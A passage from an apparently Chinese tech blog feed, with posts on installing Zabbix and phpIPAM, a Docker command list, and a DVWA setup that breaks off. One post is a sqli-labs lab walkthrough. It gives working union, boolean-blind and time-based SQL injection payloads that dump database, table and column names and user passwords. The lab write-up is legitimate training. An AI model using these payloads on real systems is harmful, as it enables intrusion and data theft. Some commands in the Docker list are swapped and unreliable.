<h1 id="安装zabbix库"><a href="#安装zabbix库" class="headerlink" title="安装zabbix库"></a>安装zabbix库</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://repo.zabbix.com/zabbix/5.0/ubuntu/pool/main/z/zabbix-release/zabbix-release_5.0-1+focal_all.deb</span><br><span class="line">dpkg -i zabbix-release_5.0-1+focal_all.deb</span><br><span class="line">apt update</span><br></pre></td></tr></table></figure>

<h1 id="安装zabbix-server、web前端、agent"><a href="#安装zabbix-server、web前端、agent" class="headerlink" title="安装zabbix server、web前端、agent"></a>安装zabbix server、web前端、agent</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install zabbix-server-mysql zabbix-frontend-php zabbix-apache-conf zabbix-agent</span><br></pre></td></tr></table></figure>

<h1 id="安装MySQL数据库"><a href="#安装MySQL数据库" class="headerlink" title="安装MySQL数据库"></a>安装MySQL数据库</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install mysql-server</span><br></pre></td></tr></table></figure>
<ul>
<li>重置数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>

<h1 id="创建zabbix数据库"><a href="#创建zabbix数据库" class="headerlink" title="创建zabbix数据库"></a>创建zabbix数据库</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p &#x27;password&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; create database zabbix character set utf8 collate utf8_bin;</span><br><span class="line">mysql&gt; create user zabbix@localhost identified by &#x27;password&#x27;;</span><br><span class="line">mysql&gt; grant all privileges on zabbix.* to zabbix@localhost;</span><br><span class="line">mysql&gt; quit;</span><br></pre></td></tr></table></figure>
<h1 id="导入zabbix数据库"><a href="#导入zabbix数据库" class="headerlink" title="导入zabbix数据库"></a>导入zabbix数据库</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -p zabbix</span><br></pre></td></tr></table></figure>
<h1 id="配置zabbix-server配置文件"><a href="#配置zabbix-server配置文件" class="headerlink" title="配置zabbix server配置文件"></a>配置zabbix server配置文件</h1><p>编辑配置文件/etc/zabbix/zabbix_server.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DBPassword=password //在数据库中设置的密码</span><br></pre></td></tr></table></figure>
<h1 id="配置zabbix-server时区"><a href="#配置zabbix-server时区" class="headerlink" title="配置zabbix_server时区"></a>配置zabbix_server时区</h1><p>编辑配置文件 /etc/zabbix/apache.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value date.timezone Asia/shanghai</span><br></pre></td></tr></table></figure>
<h1 id="启动zabbix-server、agent、MySQL等服务"><a href="#启动zabbix-server、agent、MySQL等服务" class="headerlink" title="启动zabbix server、agent、MySQL等服务"></a>启动zabbix server、agent、MySQL等服务</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart zabbix-server zabbix-agent apache2 mysql-server</span><br></pre></td></tr></table></figure>
<h1 id="设置服务开机自启"><a href="#设置服务开机自启" class="headerlink" title="设置服务开机自启"></a>设置服务开机自启</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable zabbix-server zabbix-agent apache2 mysql-server</span><br></pre></td></tr></table></figure>

<h1 id="web页面中文乱码问题"><a href="#web页面中文乱码问题" class="headerlink" title="web页面中文乱码问题"></a>web页面中文乱码问题</h1><p>1、复制本地电脑C:\Windows\Fonts\simkai.ttf（楷体）上传到zabbix服务器网站目录的fonts目录下。<br>此步骤可以使用winscp软件。<br>2、修改zabbix字体为刚才上传的字体，graphfont.ttf是zabbix默认字符集。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/zabbix/fonts</span><br><span class="line">mv graphfont.ttf graphfont.ttf.bak</span><br><span class="line">mv msyh.ttc graphfont.ttf</span><br></pre></td></tr></table></figure>
<p>刷新web页面，可以看到中文正常显示。</p>
<h1 id="主机名不能输入中文问题"><a href="#主机名不能输入中文问题" class="headerlink" title="主机名不能输入中文问题"></a>主机名不能输入中文问题</h1><p>修改zabbix的php文件：/usr/share/zabbix/include/defines.inc.php</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- define(&#x27;ZBX_PREG_INTERNAL_NAMES&#x27;, &#x27;([0-9a-zA-Z_\. \-]+)&#x27;);</span></span><br><span class="line"><span class="addition">+ define(&#x27;ZBX_PREG_INTERNAL_NAMES&#x27;, &#x27;([0-9a-zA-Z_\. \-\x&#123;80&#125;-\x&#123;ff&#125;]+)&#x27;);</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
        <tag>zabbix监控</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7搭建phpipam开源IP地址管理系统</title>
    <url>/archives/d7fca313.html</url>
    <content><![CDATA[<p>在日常网络管理工作中，避免不了IP地址台账问题，phpipam的出现解决了不用在电脑中一次一次的更新execl表格，更便于台账更新与管理。<br>也可以通过snmp探测内网中存活主机，功能还是比较强大的，不过我只用于台账的管理。下图是phpipam所支持的功能列表：</p>
<span id="more"></span>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/phpipam/phpipam.png"></p>
<h1 id="关闭本身防火墙和selinux"><a href="#关闭本身防火墙和selinux" class="headerlink" title="关闭本身防火墙和selinux"></a>关闭本身防火墙和selinux</h1><h2 id="关闭selinux"><a href="#关闭selinux" class="headerlink" title="关闭selinux"></a>关闭selinux</h2><ul>
<li>vim /etc/selinux/config</li>
</ul>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- SELINUX=enforcing</span></span><br><span class="line"><span class="addition">+ SELINUX=disabled</span></span><br></pre></td></tr></table></figure>
<h2 id="卸载防火墙"><a href="#卸载防火墙" class="headerlink" title="卸载防火墙"></a>卸载防火墙</h2><p>我选择的是卸载firewalld，选择用iptables。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y remove firewalld</span><br></pre></td></tr></table></figure>
<h1 id="设置语言环境"><a href="#设置语言环境" class="headerlink" title="设置语言环境"></a>设置语言环境</h1><ul>
<li>vim /etc/environment</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LC_ALL = zh_CN.utf-8</span><br><span class="line">LANG = en_US.utf-8</span><br></pre></td></tr></table></figure>
<h1 id="安装LAMP环境"><a href="#安装LAMP环境" class="headerlink" title="安装LAMP环境"></a>安装LAMP环境</h1><ul>
<li>安装phpipam所需的所有软件包：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install httpd mariadb-server php php-cli php-gd php-common php-ldap php-pdo php-pear php-snmp php-xml php-mysql php-mbstring git</span><br></pre></td></tr></table></figure>

<ul>
<li>如果需要API的crypt方法，则还需要安装php-mcrypt php扩展名，该文件可在epel-release软件包中找到：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install epel-release php-mcrypt</span><br></pre></td></tr></table></figure>
<h2 id="配置apache-web服务器"><a href="#配置apache-web服务器" class="headerlink" title="配置apache web服务器"></a>配置apache web服务器</h2><ul>
<li>修改apache配置文件</li>
<li>vim /etc/httpd/conf/httpd.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory &quot;/var/www/html&quot;&gt;</span><br><span class="line">	Options FollowSymLinks</span><br><span class="line">	AllowOverride all</span><br><span class="line">	Order allow,deny</span><br><span class="line">	Allow from all</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果想修改默认端口的话，需要修改ServerName locahost:的值并取消注释。</li>
</ul>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- ;ServerName localhost:80</span></span><br><span class="line"><span class="addition">+ ServerName localhost:8000</span></span><br></pre></td></tr></table></figure>
<h2 id="修改时区"><a href="#修改时区" class="headerlink" title="修改时区"></a>修改时区</h2><ul>
<li>vim /etc/php.ini</li>
</ul>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- ;date.timezone = </span></span><br><span class="line"><span class="addition">+ date.timezone = Aisa/Shanghai</span></span><br></pre></td></tr></table></figure>
<h2 id="开启HTTP服务"><a href="#开启HTTP服务" class="headerlink" title="开启HTTP服务"></a>开启HTTP服务</h2><ul>
<li>开启服务</li>
</ul>
<p><code>systemctl start httpd</code></p>
<ul>
<li>开机自启</li>
</ul>
<p><code>systemctl enable httpd</code></p>
<ul>
<li>重启服务</li>
</ul>
<p><code>systemctl restart httpd</code></p>
<h1 id="配置MySQL（mariadb）"><a href="#配置MySQL（mariadb）" class="headerlink" title="配置MySQL（mariadb）"></a>配置MySQL（mariadb）</h1><ul>
<li>开启服务</li>
</ul>
<p><code>systemctl start mariadb</code></p>
<ul>
<li>开机自启</li>
</ul>
<p><code>systemctl enable mariadb</code></p>
<ul>
<li>重启服务</li>
</ul>
<p><code>systemctl restart mariadb</code></p>
<ul>
<li>设置mariadb，root用户密码</li>
</ul>
<p><code>mysqladmin -u root password 新密码</code></p>
<h2 id="创建所需所需数据库"><a href="#创建所需所需数据库" class="headerlink" title="创建所需所需数据库"></a>创建所需所需数据库</h2><ul>
<li>进入数据库</li>
</ul>
<p><code>mysql -uroot -p 密码</code></p>
<ul>
<li>创建数据库</li>
</ul>
<p><code>create database phpipam</code></p>
<ul>
<li>创建用户</li>
</ul>
<p><code>create user &#39;phpipam&#39;@&#39;localhost&#39; identified by &#39;密码&#39;;</code></p>
<ul>
<li>赋予权限</li>
</ul>
<p><code>grant all privileges on phpipam.* to &#39;phpipam&#39;@&#39;localhost&#39;;</code></p>
<h1 id="安装phpipam"><a href="#安装phpipam" class="headerlink" title="安装phpipam"></a>安装phpipam</h1><ul>
<li>进入/var/www/html/目录下：</li>
</ul>
<p><code>cd /var/www/html</code></p>
<ul>
<li>克隆源代码</li>
</ul>
<p><code>git clone https://github.com/phpipam/phpipam.git</code></p>
<ul>
<li>使用1.4版本</li>
</ul>
<p><code>git checkout 1.4</code></p>
<ul>
<li>修改phpipam目录所有者</li>
</ul>
<p><code>chown -R apache:apache /var/www/html/phpipam</code></p>
<ul>
<li>更改phpipam配置文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp config.dist.php config.php</span><br></pre></td></tr></table></figure>
<p>需要修改config.php文件中数据库密码，端口等。</p>
<h1 id="访问安装页面"><a href="#访问安装页面" class="headerlink" title="访问安装页面"></a>访问安装页面</h1><ul>
<li>用浏览器打开安装页面，选择全新安装，输入phpipam的用户名和密码，等待网站安装完成，登陆进去可以选择中文显示，和开启对应的命令，更多功能需要自己去摸索。</li>
</ul>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>phpipam</tag>
        <tag>IP地址管理</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入靶场sqli-labs 1-10关通关教程</title>
    <url>/archives/6ef1c9b9.html</url>
    <content><![CDATA[<p>sql注入是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的sql语句来实现对数据库的任意操作。</p>
<span id="more"></span>
<h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><p>sql注入漏洞的产生需要满足以下两个条件：</p>
<ul>
<li>参数用户可控：前端传给后端的参数内容是用户可控的。</li>
<li>参数带入数据库查询：传入的参数拼接到sql语句，且带入数据库查询。</li>
</ul>
<p>当传入的ID参数为1’时，数据库执行的代码如下表示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id =1&#x27;</span><br></pre></td></tr></table></figure>

<p>这不符合数据库语法规范，所以会报错。当传入的ID参数为and 1=1时，执行的sql语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id = 1 and 1=1</span><br></pre></td></tr></table></figure>

<p>因为1=1为真，且where语句中id=1也为真，所以页面会返回与id=1相同的结果。当传入的ID参数为and 1=2不成立，所以返回假，页面就会返回与id=1不同的结果。<br>由此可以初步判断ID参数存在sql注入漏洞，攻击者可以进一步拼接sql语句进行攻击，导致数据库信息泄露，甚至进一步获取服务器权限等。</p>
<h1 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h1><p>在mysql5.0版本之后，mysql默认在数据库中存放一个‘information——schema’的数据库，在该数据库中分别有三个表：SCHEMATA、TABLES、COLUMNS。</p>
<ul>
<li>SCHEMATA表: 储存该用户创建的所有数据库的库名。记录数据库库名的表字段为SCHEMA_NAME</li>
<li>TABLES表：表示该用户创建的所有数据库的库名和表名，该表记录数据库库名和表名的字段分别为TABLE_SCHEMA和TABLE_NAME。</li>
<li>COLUMNS表：储存该用户创建的所有数据库的库名、表名、字段名，该表记录数据库库名、表名和字段名的字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。</li>
</ul>
<h2 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h2><p>limit的使用格式为limit m,n,其中m是指记录开始的位置，从0开始，表示第一条记录：n是指取n条记录。例如limit 0,1表示从第一条记录开始，取一条记录。</p>
<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p>在mysql中，常见注释符的表达方式：</p>
<ul>
<li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li>
<li>–空格</li>
<li>/**/</li>
</ul>
<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>看提示为字符型注入，分别尝试<code>?id=1</code>、<code>?id=1</code>‘、<code>?id=1&quot;</code>添加到url中，发现<code>?id=1&#39;</code>报错，说明是字符型注入而且是单引号注入。<br>我们可以在<a href="http://192.168.150.16/Less-1/%E5%90%8E%E9%9D%A2%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0%60?id=1&#39;%60%EF%BC%8C%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%E5%9B%BE%EF%BC%9A">http://192.168.150.16/Less-1/后面直接添加`?id=1&#39;`，结果如下图：</a><br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.1.png"><br>从上面的错误当中，可以看到提交到sql中的<code>1&#39;</code>在经过sql语句构造后形成<code>&#39;1&#39;&#39; LIMIT 0,1</code>,多加了一个<code>&#39;</code>。这种方式就是从错误信息中得到需要的信息，接下来就是去掉多余的<code>&#39;</code>。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>在url中空格和一些特殊字符会进行url编码，例如：</p>
<ul>
<li>#：%23</li>
<li>空格：%20</li>
<li>‘：%27</li>
<li>+：空格</li>
</ul>
<h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><p>这里选择在<code>&#39;</code>后面加上<code>--+</code>进行闭合。访问<code>id=1 and 1=1</code>，由于<code>and 1=1</code>为真，所以页面应返回与<code>id=1</code>相同的结果，如下图<br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.2.png"><br>访问<code>id=1 and 1=2</code>，由于<code>and 1=2</code>为假，所以页面应返回与<code>id=1</code>不同的结果。如下图：<br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.3.png"><br>可以得出该网站可能存在sql注入漏洞的结论。接着使用<code>order by</code>查询该数据表的字段数量。如下图：<br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.4.png"><br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.5.png"><br>在数据库中查询参数ID对应的内容然后将数据库的内容输出到页面，由于是将数据输出到页面上的，所以可以使用Union注入，并通过<code>order by</code>查询结果，得到字段数为3，所以union注入的语句如下表示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.6.png"><br>可以通过设置参数ID值，让服务器端返回union select的结果，例如：把ID的值设置-1，这样数据库中没有id=-1的数据，所以会返回union select的结果。<br><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.7.png"><br>返回结果为2和3，意味着在union select 1,2,3中，2和3的位置可以输入MySQL语句。</p>
<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.150.16/Less-1/?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.9.png"></p>
<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.150.16/Less-1/?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables  where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.10.png"></p>
<h3 id="爆表字段"><a href="#爆表字段" class="headerlink" title="爆表字段"></a>爆表字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.150.16/Less-1/?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns  where table_name=&#x27;users&#x27;  --+</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.11.png"></p>
<h3 id="爆表字段的内容"><a href="#爆表字段的内容" class="headerlink" title="爆表字段的内容"></a>爆表字段的内容</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.150.16/Less-1/?id=-1&#x27; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)  --+</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-1.12.png"></p>
<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>数字型注入,不需要去闭合。</p>
<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>跟第一关基本一样，这个是需要闭合前面的括号。<code>&#39;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=select * from users where id=(&quot;$id&quot;);</span><br></pre></td></tr></table></figure>
<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>跟第三关一样，<code>&#39;)</code>换成<code>&quot;)</code>这样就可以啦。</p>
<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>打开发现只有一个you are in….. 将id改为一个不存在的数值就消失，可以判断是盲注，加单引号就报错，所以有sql注入。<br>由于页面只返回you are in…..或者不显示，所以此处不可使用union注入。可以尝试boolean进行注入或者其他方法，这里我使用的是Boolean。</p>
<p>Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测那些SQL判断条件是成立的，以此获取数据库中的数据。</p>
<p>这里使用的工具是burpsuite。</p>
<ul>
<li>判断数据库名的长度。</li>
</ul>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.1.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.2.png"></p>
<p>由此可以得出数据库库名长度为8。</p>
<ul>
<li>利用substr判断数据库的库名</li>
</ul>
<p>数据库的库名范围一般在a~Z、0-9之内，可能还有一些特殊字符，这里的字母不区分大小写。逐字符判断的sql语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr(database(),1,1)=&#x27;i&#x27;--+</span><br></pre></td></tr></table></figure>

<p>substr是截取的意思，意思是截取database()的值，从第一个字符开始，每次只返回一个。</p>
<p>substr的用法跟limit的有区别，需要注意。limit是从0开始排序，而这里是从1开始排序。可以使用burp的爆破功能爆破其中的’i’值。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.3.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.4.png"></p>
<ul>
<li>利用substr判断数据库的表名</li>
</ul>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.5.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-5.6.png"></p>
<p>以此类推，就可以查询出所有的表名与字段名。</p>
<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>跟第五关一样，只是将单引号换成了双引号。</p>
<h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>在这里的显示是Use oufile，oufile函数是mysql写入文件的一种函数，经常被用来写入webshell，同时mysql还有个读取文件的函数load_file函数，但是使用之前都需要找到网站的绝对路径。注意这两个函数能否成功执行受到参数secure_file_priv的影响。</p>
<ul>
<li>其中当参数secure_file_priv为空时，对导入导出无限制</li>
<li>当值为一个指定的目录时，只能向指定的目录导入导出</li>
<li>当值被设置为NULL时，禁止导入导出功能<br>这一关还是忍不住使用了sqlmap，手动滑稽。</li>
</ul>
<p>这篇有详细的思路：<a href="https://www.cnblogs.com/Xy--1/p/12726288.html" title="sqli-labs通关教程----1~10关">sqli-labs通关教程—-1~10关</a></p>
<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>不能使用报错注入，其他跟第五关一样。</p>
<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>这一关使用的是时间注入攻击。时间注入是利用sleep()或benchmark()等函数让MySQL的执行时间变长。时间盲注多与IF(expr1,expr2,expr3)结合使用，此IF语句含义是：如果expr1为true，则IF()的返回值为expr2：否则返回值则为expr3。<br>所以判断数据库的长度语句为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if (length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-9.1.png"></p>
<p>可以看到页面相应时间为5s。多次测试后可以得到数据库库名的长度。</p>
<p>接下来就可以进行对数据库表名的猜解。<br>语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if (substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)</span><br></pre></td></tr></table></figure>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/sqli-libs/Less-9.2.png"></p>
<p>说明数据库名的第一位字母为s，以此类推就可以得到完整的数据库的库名，表名、字段名、和具体数据。</p>
<ul>
<li>爆表名：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.150.17/Less-9/?id=1&#x27; and  if(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)=&#x27;e&#x27;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>

<ul>
<li>爆列名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.150.17/Less-9/?id=1&#x27; and  if(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1)&gt;&#x27;e&#x27;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>

<ul>
<li>具体数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.150.17/Less-9/?id=1&#x27; and  If(ascii(substr((select password from users limit 0,1),1,1))&lt;101,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>跟第九关一样时间盲注，单引号换成双引号。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.cnblogs.com/Xy--1/p/12726288.html" title="sqli-labs通关教程----1~10关">sqli-labs通关教程—-1~10关</a></li>
<li>web安全攻防渗透测试指南</li>
</ul>
]]></content>
      <categories>
        <category>网络安全攻防</category>
      </categories>
      <tags>
        <tag>sql注入，sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令总结</title>
    <url>/archives/8c6dafda.html</url>
    <content><![CDATA[<p>docker常用命令备忘录。</p>
<span id="more"></span>
<h1 id="查看docker版本"><a href="#查看docker版本" class="headerlink" title="查看docker版本"></a>查看docker版本</h1><p><code>docker version</code></p>
<h1 id="启动docker服务"><a href="#启动docker服务" class="headerlink" title="启动docker服务"></a>启动docker服务</h1><p><code>systemctl start docker</code></p>
<h1 id="开机自启docker服务"><a href="#开机自启docker服务" class="headerlink" title="开机自启docker服务"></a>开机自启docker服务</h1><p><code>systemctl enable docker</code></p>
<h1 id="查看docker服务状态"><a href="#查看docker服务状态" class="headerlink" title="查看docker服务状态"></a>查看docker服务状态</h1><p><code>systemctl status docker</code></p>
<h1 id="关闭docker服务"><a href="#关闭docker服务" class="headerlink" title="关闭docker服务"></a>关闭docker服务</h1><p>systemctl stop docker</p>
<h1 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h1><p><code>docker search 镜像名字</code></p>
<h1 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h1><p><code>docker pull 镜像名字</code></p>
<h1 id="查看本地拉取的镜像"><a href="#查看本地拉取的镜像" class="headerlink" title="查看本地拉取的镜像"></a>查看本地拉取的镜像</h1><p><code>docker images</code></p>
<h1 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h1><p><code>docker rm 镜像ID</code></p>
<h1 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h1><p><code>docker ps -a</code></p>
<h1 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h1><p><code>docker rmi 容器ID</code></p>
<h1 id="查看运行中的容器"><a href="#查看运行中的容器" class="headerlink" title="查看运行中的容器"></a>查看运行中的容器</h1><p><code>docker ps</code></p>
<h1 id="停止运行的容器"><a href="#停止运行的容器" class="headerlink" title="停止运行的容器"></a>停止运行的容器</h1><p><code>docker stop 运行容器ID</code></p>
<h1 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h1><ul>
<li>启动容器以后台方式运行</li>
</ul>
<p><code>docker run -d -it  image_name</code></p>
<ul>
<li>映射端口</li>
</ul>
<p><code>docker run -d -it -p 8000:80 image_name</code></p>
<ul>
<li>启动后重命名</li>
</ul>
<p><code>docker run -d -it -name name image_name</code></p>
<ul>
<li>跟随系统开机自启</li>
</ul>
<p><code>docker run -d -it --restart=always  image_name</code></p>
<h1 id="命令行交互"><a href="#命令行交互" class="headerlink" title="命令行交互"></a>命令行交互</h1><p><code>docker exec -it &lt;id/container_name&gt;  /bin/bash</code></p>
<h1 id="容器日志"><a href="#容器日志" class="headerlink" title="容器日志"></a>容器日志</h1><ul>
<li>查看容器日志</li>
</ul>
<p><code>docker logs &lt;id/container_name&gt;</code></p>
<ul>
<li>查看实时日志</li>
</ul>
<p><code>docker logs -f &lt;id/container_name&gt; (类似 tail -f) (带上时间戳-t）</code></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker安装DVWA</title>
    <url>/archives/f73aa19b.html</url>
    <content><![CDATA[<p>前面介绍了docker和docker-compose的安装，下面就开始了一些平台的搭建，第一个搭建的就是dvwa环境。</p>
<span id="more"></span>

<h1 id="DVWA介绍"><a href="#DVWA介绍" class="headerlink" title="DVWA介绍"></a>DVWA介绍</h1><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
<p>dvwa提供的有以下十个模块：</p>
<ul>
<li>Brute Force (暴力破解)</li>
<li>Command Injection（命令行注入）</li>
<li>CSRF （跨站请求攻击）</li>
<li>File Inclusion （文件包含）</li>
<li>File Upload （文件上传）</li>
<li>Insecure CAPTCHA （不安全的验证码）</li>
<li>SQL Injection （SQL注入）</li>
<li>SQL Injection（Blind）（SQL盲注）</li>
<li>XSS （Reflected） （反射型跨站脚本）</li>
<li>XSS （Stored） （储存型跨站脚本）</li>
</ul>
<h1 id="docker安装dvwa"><a href="#docker安装dvwa" class="headerlink" title="docker安装dvwa"></a>docker安装dvwa</h1><p>查找dvwa镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search dvwa</span><br></pre></td></tr></table></figure>

<p>拉取dvwa镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>

<p>运行dvwa镜像</p>
